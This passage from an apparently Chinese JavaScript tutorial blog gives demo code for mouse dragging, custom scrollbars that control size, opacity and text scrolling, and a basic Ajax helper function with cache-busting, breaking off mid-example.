</li>
</ul>
<p>####　磁性吸附</p>
<ul>
<li>修改legth的大小判断条件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			var t=oEvent.clientY-disY;</div><div class="line">			</div><div class="line">			if(l&lt;50)  //修改legth的大小判断条件</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;oDiv2.offsetWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=oDiv2.offsetWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			if(t&lt;50)</div><div class="line">			&#123;</div><div class="line">				t=0;</div><div class="line">			&#125;</div><div class="line">			else if(t&gt;oDiv2.offsetHeight-oDiv.offsetHeight)</div><div class="line">			&#123;</div><div class="line">				t=oDiv2.offsetHeight-oDiv.offsetHeight;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			oDiv.style.top=t+&apos;px&apos;;</div><div class="line">		&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="高级拖拽-2"><a href="#高级拖拽-2" class="headerlink" title="高级拖拽-2"></a>高级拖拽-2</h2><h3 id="图片拖拽"><a href="#图片拖拽" class="headerlink" title="图片拖拽"></a>图片拖拽</h3><ul>
<li>阻止默认事件<h3 id="文字选中"><a href="#文字选中" class="headerlink" title="文字选中"></a>文字选中</h3></li>
<li>阻止默认事件</li>
<li>IE下拖动有问题</li>
</ul>
<h4 id="事件捕获"><a href="#事件捕获" class="headerlink" title="事件捕获"></a>事件捕获</h4><ul>
<li>setCapture()     开启捕获</li>
<li>releaseCapture() 释放捕获</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	var disY=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">		disY=oEvent.clientY-oDiv.offsetTop;</div><div class="line">		</div><div class="line">		if(oDiv.setCapture)</div><div class="line">		&#123;</div><div class="line">			//IE</div><div class="line">			oDiv.onmousemove=mouseMove;</div><div class="line">			oDiv.onmouseup=mouseUp;</div><div class="line">			</div><div class="line">			oDiv.setCapture();</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			//Chrome、FF</div><div class="line">			document.onmousemove=mouseMove;</div><div class="line">			document.onmouseup=mouseUp;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		function mouseMove(ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			var t=oEvent.clientY-disY;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			oDiv.style.top=t+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		function mouseUp()</div><div class="line">		&#123;</div><div class="line">			this.onmousemove=null;</div><div class="line">			this.onmouseup=null;</div><div class="line">			</div><div class="line">			if(oDiv.releaseCapture)</div><div class="line">			&#123;</div><div class="line">				oDiv.releaseCapture();</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">asdfasdfsdf&lt;br&gt;</div><div class="line">dfasfasdfasd</div><div class="line">&lt;div id=&quot;div1&quot;&gt;asdfasdfsdf&lt;br&gt;</div><div class="line">dfasfasdfasd&lt;/div&gt;</div><div class="line">asdfasdfsdf&lt;br&gt;</div><div class="line">dfasfasdfasd</div></pre></td></tr></table></figure>
<h3 id="与DOM配合"><a href="#与DOM配合" class="headerlink" title="与DOM配合"></a>与DOM配合</h3><ul>
<li>带框的拖拽</li>
<li>保留原有位置的拖拽</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:100px; height:100px; background:yellow; position:absolute;&#125;</div><div class="line">.box &#123;border:1px dashed black; position:absolute;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	var disY=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">		disY=oEvent.clientY-oDiv.offsetTop;</div><div class="line">		</div><div class="line">		var oBox=document.createElement(&apos;div&apos;);</div><div class="line">		</div><div class="line">		oBox.className=&apos;box&apos;;</div><div class="line">		oBox.style.width=oDiv.offsetWidth-2+&apos;px&apos;;</div><div class="line">		oBox.style.height=oDiv.offsetHeight-2+&apos;px&apos;;</div><div class="line">		</div><div class="line">		oBox.style.left=oDiv.offsetLeft+&apos;px&apos;;</div><div class="line">		oBox.style.top=oDiv.offsetTop+&apos;px&apos;;</div><div class="line">		</div><div class="line">		document.body.appendChild(oBox);</div><div class="line">		</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			var t=oEvent.clientY-disY;</div><div class="line">			</div><div class="line">			oBox.style.left=l+&apos;px&apos;;</div><div class="line">			oBox.style.top=t+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">			</div><div class="line">			oDiv.style.left=oBox.offsetLeft+&apos;px&apos;;</div><div class="line">			oDiv.style.top=oBox.offsetTop+&apos;px&apos;;</div><div class="line">			</div><div class="line">			document.body.removeChild(oBox);</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="自定义滚动条"><a href="#自定义滚动条" class="headerlink" title="自定义滚动条"></a>自定义滚动条</h2><h3 id="拖拽-1"><a href="#拖拽-1" class="headerlink" title="拖拽"></a>拖拽</h3><ul>
<li>只有横向拖拽</li>
<li>限制范围——范围的大小</li>
<li>计算比例——当前值/最大值<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</div><div class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var oParent=document.getElementById(&apos;parent&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">				</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			</div><div class="line">			if(l&lt;0)</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;parent&quot;&gt;</div><div class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="控制其他对象"><a href="#控制其他对象" class="headerlink" title="控制其他对象"></a>控制其他对象</h3><h4 id="例子1：控制物体的大小"><a href="#例子1：控制物体的大小" class="headerlink" title="例子1：控制物体的大小"></a>例子1：控制物体的大小</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</div><div class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</div><div class="line">#div2 &#123;width:0px; height:0px; background:green;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</div><div class="line">	var oParent=document.getElementById(&apos;parent&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">				</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			</div><div class="line">			if(l&lt;0)</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			</div><div class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</div><div class="line">			document.title=scale;</div><div class="line">			</div><div class="line">			oDiv2.style.width=400*scale+&apos;px&apos;;</div><div class="line">			oDiv2.style.height=400*scale+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;parent&quot;&gt;</div><div class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h4 id="例子2：控制物体的透明度"><a href="#例子2：控制物体的透明度" class="headerlink" title="例子2：控制物体的透明度"></a>例子2：控制物体的透明度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</div><div class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</div><div class="line">#div2 &#123;width:300px; height:300px; background:green; filter:alpha(opacity:0); opacity:0;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</div><div class="line">	var oParent=document.getElementById(&apos;parent&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">				</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			</div><div class="line">			if(l&lt;0)</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			</div><div class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</div><div class="line">			document.title=scale;</div><div class="line">			</div><div class="line">			oDiv2.style.filter=&apos;alpha(opacity:&apos;+scale*100+&apos;)&apos;;</div><div class="line">			oDiv2.style.opacity=scale;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;parent&quot;&gt;</div><div class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h4 id="例子3：控制文字滚动"><a href="#例子3：控制文字滚动" class="headerlink" title="例子3：控制文字滚动"></a>例子3：控制文字滚动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</div><div class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</div><div class="line">#div2 &#123;width:400px; height:300px; border:1px solid black; overflow:hidden; position:relative;&#125;</div><div class="line">#div3 &#123;position:absolute; left:0; top:0; padding:4px;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</div><div class="line">	var oDiv3=document.getElementById(&apos;div3&apos;);</div><div class="line">	var oParent=document.getElementById(&apos;parent&apos;);</div><div class="line">	</div><div class="line">	var disX=0;</div><div class="line">	</div><div class="line">	oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</div><div class="line">				</div><div class="line">		document.onmousemove=function (ev)</div><div class="line">		&#123;</div><div class="line">			var oEvent=ev||event;</div><div class="line">			var l=oEvent.clientX-disX;</div><div class="line">			</div><div class="line">			if(l&lt;0)</div><div class="line">			&#123;</div><div class="line">				l=0;</div><div class="line">			&#125;</div><div class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</div><div class="line">			&#123;</div><div class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			oDiv.style.left=l+&apos;px&apos;;</div><div class="line">			</div><div class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</div><div class="line">			document.title=scale;</div><div class="line">			</div><div class="line">			oDiv3.style.top=-scale*(oDiv3.offsetHeight-oDiv2.offsetHeight)+&apos;px&apos;;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		document.onmouseup=function ()</div><div class="line">		&#123;</div><div class="line">			document.onmousemove=null;</div><div class="line">			document.onmouseup=null;</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		return false;	//chrome、ff、IE9</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;parent&quot;&gt;</div><div class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;</div><div class="line">	&lt;div id=&quot;div3&quot;&gt;    </div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<h1 id="Ajax基础"><a href="#Ajax基础" class="headerlink" title="Ajax基础"></a>Ajax基础</h1><h2 id="什么是-Ajax"><a href="#什么是-Ajax" class="headerlink" title="什么是 Ajax"></a>什么是 Ajax</h2><p>AJAX = 异步 JavaScript 和 XML。<br>AJAX 是一种用于创建快速动态网页的技术。<br>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<h3 id="Ajax-js"><a href="#Ajax-js" class="headerlink" title="Ajax.js"></a>Ajax.js</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">function ajax(url, fnSucc, fnFaild)</div><div class="line">&#123;</div><div class="line">	//1.创建Ajax对象</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	&#123;</div><div class="line">		var oAjax=new XMLHttpRequest();</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	//2.连接服务器（打开和服务器的连接）</div><div class="line">	oAjax.open(&apos;GET&apos;, url, true);</div><div class="line">	</div><div class="line">	</div><div class="line">	//3.发送</div><div class="line">	oAjax.send();</div><div class="line">	</div><div class="line">	//4.接收</div><div class="line">	oAjax.onreadystatechange=function ()</div><div class="line">	&#123;</div><div class="line">		if(oAjax.readyState==4)</div><div class="line">		&#123;</div><div class="line">			if(oAjax.status==200)</div><div class="line">			&#123;</div><div class="line">				//alert(&apos;成功了：&apos;+oAjax.responseText);</div><div class="line">				fnSucc(oAjax.responseText);</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				//alert(&apos;失败了&apos;);</div><div class="line">				if(fnFaild)</div><div class="line">				&#123;</div><div class="line">					fnFaild();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="使用Ajax"><a href="#使用Ajax" class="headerlink" title="使用Ajax"></a>使用Ajax</h2><h3 id="基础：请求并显示静态TXT文件"><a href="#基础：请求并显示静态TXT文件" class="headerlink" title="基础：请求并显示静态TXT文件"></a>基础：请求并显示静态TXT文件</h3><ul>
<li>字符集编码（统一编码）</li>
<li>缓存、阻止缓存<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;ajax.js&quot;&gt;&lt;/script&gt;  //引用ajax.js</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		ajax(&apos;aaa.txt&apos;, function (str)&#123;</div><div class="line">			alert(str);</div><div class="line">		&#125;, function ()&#123;</div><div class="line">			alert(&apos;失败&apos;);</div><div class="line">		&#125;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;1input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;读取&quot; /&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="阻止缓存"><a href="#阻止缓存" class="headerlink" title="阻止缓存"></a>阻止缓存</h4><ul>
<li>ajax(‘aaa.txt?t=’+new Date().getTime(), function (str)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		ajax(&apos;aaa.txt?t=&apos;+new Date().getTime(), function (str)&#123;</div><div class="line">			alert(str);</div><div class="line">		&#125;, function ()&#123;</div><div class="line">			alert(&apos;失败&apos;);</div><div class="line">		&#125;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="动态数据：请求JS（或Json）文件"><a href="#动态数据：请求JS（或Json）文件" class="headerlink" title="动态数据：请求JS（或Json）文件"></a>动态数据：请求JS（或Json）文件</h3><ul>
<li>eval的使用</li>
<li>DOM创建元素<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;ajax.js&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	</div><div class="line">	